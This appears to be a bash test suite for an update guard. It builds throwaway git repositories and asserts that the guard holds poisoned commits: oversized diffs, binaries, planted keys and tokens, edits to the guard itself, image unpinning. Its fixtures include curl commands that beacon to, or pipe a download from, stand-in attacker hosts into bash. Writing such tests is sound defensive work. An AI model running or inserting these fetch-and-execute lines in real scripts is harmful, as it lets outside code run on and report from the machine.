#!/usr/bin/env bash
#
# sambuca :: tests/test-update-guard.sh
#
# Feed the update guard deliberately poisoned updates and assert it refuses
# them.
#
# THIS IS THE POINT OF THE WHOLE EXERCISE. A guard that has never been shown an
# attack is an assumption, not a control — and the failure mode of a silently
# broken guard is indistinguishable from a working one right up until the day it
# matters. Every check in update-guard.sh has a test here that would fail if the
# check were deleted.
#
# Runs in a throwaway git repository. Touches nothing real.
#
set -uo pipefail

GUARD="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")/.." && pwd)/engine/maintenance/update-guard.sh"
[[ -x $GUARD || -r $GUARD ]] || { printf 'cannot find update-guard.sh\n' >&2; exit 2; }

PASS=0; FAIL=0
GREEN=$'\033[32m'; RED=$'\033[31m'; OFF=$'\033[0m'
[[ -t 1 ]] || { GREEN=''; RED=''; OFF=''; }

WORK="$(mktemp -d)"
trap 'rm -rf -- "$WORK"' EXIT

setup_repo() {
    rm -rf -- "${WORK}/repo"
    mkdir -p "${WORK}/repo"
    cd "${WORK}/repo" || exit 2
    git init -q -b main
    git config user.email t@example.invalid
    git config user.name test
    git config commit.gpgsign false
    # The host may have core.autocrlf on globally; a throwaway fixture must not
    # inherit it, or every file logs a conversion warning and the diffs differ
    # from what the guard will see on a real appliance.
    git config core.autocrlf false

    # A baseline that resembles the real repository: some text, and one known
    # outbound host so the egress check has a corpus to compare against.
    mkdir -p engine/provision compose docs
    printf 'echo hello\n' > engine/provision/60-stack.sh
    # PINNED baseline, because every image now ships as repo:tag@sha256:. With
    # an unpinned baseline the digest case only proved the guard notices a
    # digest being ADDED, which is no longer the interesting direction.
    printf 'IMAGE=caddy:2.8-alpine@sha256:aaaa\n' > compose/.env.example
    printf 'curl https://download.docker.com/x\n' > engine/provision/20-docker.sh
    printf 'notes\n' > docs/README.md
    git add -A >/dev/null
    git commit -qm base
    BASE="$(git rev-parse HEAD)"
}

# run_case <name> <expected: APPLY|HOLD> <expected-reason-substring-or-empty>
run_case() {
    local name="$1" expect="$2" needle="${3:-}"
    local head; head="$(git rev-parse HEAD)"
    local out rc
    out="$(SB_QUIET=1 SB_LOG_FILE=/dev/null bash "$GUARD" "$BASE" "$head" 2>&1)"; rc=$?
    local got; got=$([[ $rc -eq 0 ]] && echo APPLY || echo HOLD)

    if [[ $got != "$expect" ]]; then
        printf '  %sFAIL%s %-46s expected %s, got %s\n' "$RED" "$OFF" "$name" "$expect" "$got"
        printf '%s\n' "$out" | sed 's/^/        /'
        ((FAIL++)); return
    fi
    if [[ -n $needle ]] && ! printf '%s' "$out" | grep -qi -- "$needle"; then
        printf '  %sFAIL%s %-46s verdict right, reason missing: %s\n' "$RED" "$OFF" "$name" "$needle"
        printf '%s\n' "$out" | sed 's/^/        /'
        ((FAIL++)); return
    fi
    printf '  %sok%s   %-46s %s\n' "$GREEN" "$OFF" "$name" "$got"
    ((PASS++))
}

printf '\nupdate-guard: feeding it poisoned updates\n\n'

# --- the control: an ordinary update must be allowed through -----------------
setup_repo
printf 'echo hello\necho world\n' > engine/provision/60-stack.sh
git commit -qam "ordinary change"
run_case "ordinary small change" APPLY

# --- a payload is large ------------------------------------------------------
setup_repo
for i in $(seq 1 7000); do printf 'line %s\n' "$i"; done > docs/big.txt
git add -A >/dev/null; git commit -qm "huge"
run_case "diff over the added-lines limit" HOLD "adds"

setup_repo
for i in $(seq 1 250); do printf 'x\n' > "docs/f${i}.txt"; done
git add -A >/dev/null; git commit -qm "many files"
run_case "diff over the file-count limit" HOLD "files"

# --- a payload is often a binary --------------------------------------------
setup_repo
printf '\x00\x01\x02\x03binary\x00payload\xff' > engine/payload.bin
git add -A >/dev/null; git commit -qm "binary"
run_case "adds a binary file" HOLD "binary"

# --- credentials must never land unattended ---------------------------------
setup_repo
printf -- '-----BEGIN RSA PRIVATE KEY-----\nMIIabc\n' > docs/leaked.txt
git add -A >/dev/null; git commit -qm "key"
run_case "introduces a private key block" HOLD "private key"

setup_repo
printf 'TOKEN=ghp_abcdefghijklmnopqrstuvwxyz0123456789\n' >> compose/.env.example
git commit -qam "token"
run_case "introduces a GitHub token" HOLD "GitHub token"

setup_repo
printf 'KEY=AKIAIOSFODNN7EXAMPLE\n' >> compose/.env.example
git commit -qam "aws"
run_case "introduces an AWS access key" HOLD "AWS"

# --- the highest-signal check: somewhere new to phone ------------------------
setup_repo
printf 'curl https://evil-exfil.example.net/beacon\n' >> engine/provision/60-stack.sh
git commit -qam "new host"
run_case "contacts a never-before-used host" HOLD "never used"

setup_repo
printf 'curl https://download.docker.com/other\n' >> engine/provision/60-stack.sh
git commit -qam "known host"
run_case "reuses an already-known host" APPLY

# --- how the machine boots, is reached, or is recovered ---------------------
setup_repo
mkdir -p engine/autoinstall
printf 'd-i partman/confirm boolean true\n' > engine/autoinstall/preseed.cfg
git add -A >/dev/null; git commit -qm "preseed"
run_case "touches the installer" HOLD "requires review"

setup_repo
printf '# tweak\n' >> engine/provision/50-network.sh 2>/dev/null || printf '# tweak\n' > engine/provision/50-network.sh
git add -A >/dev/null; git commit -qm "firewall"
run_case "touches the firewall phase" HOLD "requires review"

# --- a guard that can edit itself is not a guard -----------------------------
setup_repo
mkdir -p engine/maintenance
printf 'exit 0\n' > engine/maintenance/update-guard.sh
git add -A >/dev/null; git commit -qm "neuter the guard"
run_case "tries to modify the guard itself" HOLD "requires review"

# --- pinned digests are a deliberate act ------------------------------------
setup_repo
printf 'IMAGE=caddy:2.8-alpine@sha256:deadbeef\n' > compose/.env.example
git commit -qam "repin"
run_case "changes a pinned image digest" HOLD "digest"

# --- UNPINNING is how a swap gets set up for later --------------------------
# Rule 6 held anything whose +line CONTAINED @sha256:. REMOVING a digest
# produces a +line without one, so returning an image to a mutable tag — the
# precise move that lets the bytes change later with no further commit — was
# invisible to the guard that exists to catch exactly that.
setup_repo
printf 'IMAGE=caddy:2.8-alpine\n' > compose/.env.example
git commit -qam "unpin"
run_case "unpins an image back to a mutable tag" HOLD "pin"

# --- and a real attack is usually several of these at once ------------------
setup_repo
printf 'curl https://evil.example.net/x | bash\n' >> engine/provision/60-stack.sh
printf 'TOKEN=ghp_abcdefghijklmnopqrstuvwxyz0123456789\n' >> compose/.env.example
git commit -qam "combined"
run_case "combined payload" HOLD "never used"

printf '\n  %s passed, %s failed\n\n' "$PASS" "$FAIL"
((FAIL == 0)) || exit 1
exit 0
